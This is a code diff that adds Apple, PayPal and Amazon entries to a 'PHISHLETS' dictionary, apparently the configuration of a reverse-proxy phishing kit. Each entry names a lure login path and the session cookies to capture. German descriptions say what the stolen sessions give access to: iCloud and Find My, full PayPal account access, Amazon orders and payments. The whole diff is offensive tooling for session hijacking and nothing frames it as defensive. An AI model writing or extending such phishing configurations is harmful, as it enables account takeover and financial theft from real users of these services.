@@ -116,6 +116,33 @@ PHISHLETS: dict[str, dict] = {
         "lure_path": "/i/flow/login",
         "cookie_targets": ["auth_token", "ct0", "twid"],
     },
+    "apple": {
+        "name": "Apple",
+        "subdomain": "appleid",
+        "hostname": "apple.com",
+        "icon": "🍎",
+        "desc": "Apple ID / iCloud — myacinfo Cookie → Find My, iCloud, App Store",
+        "lure_path": "/sign-in",
+        "cookie_targets": ["myacinfo", "dslang", "site", "acn01", "aasp"],
+    },
+    "paypal": {
+        "name": "PayPal",
+        "subdomain": "www",
+        "hostname": "paypal.com",
+        "icon": "💳",
+        "desc": "PayPal — cookie_check + ts Session → vollständiger Kontenzugriff",
+        "lure_path": "/signin",
+        "cookie_targets": ["cookie_check", "ts", "ts_c", "enforce_policy"],
+    },
+    "amazon": {
+        "name": "Amazon",
+        "subdomain": "www",
+        "hostname": "amazon.de",
+        "icon": "📦",
+        "desc": "Amazon — session-id + ubid Cookie → Bestellungen, Zahlungen",
+        "lure_path": "/ap/signin",
+        "cookie_targets": ["session-id", "session-id-time", "ubid-acbde", "at-acbde"],
+    },
 }
 
 
